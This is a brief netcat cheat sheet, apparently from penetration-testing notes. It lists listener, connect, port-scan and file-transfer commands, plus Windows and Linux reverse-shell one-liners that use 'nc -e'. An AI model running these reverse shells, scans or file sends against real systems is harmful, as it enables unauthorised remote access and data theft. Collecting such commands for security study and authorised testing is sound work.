### source
https://github.com/diegocr/netcat  

### start listener
```
nc -lvp <lport>
```

### connect to given port using TCP, -v verbose, -n dont resolve
```
nc -nv <rhost> <rport>
```

### port scan, -z zero I/O mode, -w wait
```
nc -z -n -v -w1 <rhost> <rport>-<rport>
```

### Windows reverse shell
```
nc -nv <lhost> <lport> -e cmd.exe
```

### Linux reverse shell
```
nc -nv <lhost> <lport> -e /bin/sh
```

### send file (-N close connection after transfer done)
```
nc -N <lhost> <lport> < <file>
```

### receive file
```
nc -vlp <lport> > <file>
```

### receive file base64 encoded
```
nc -lnp <lport> | base64 -i -d > <file>
```

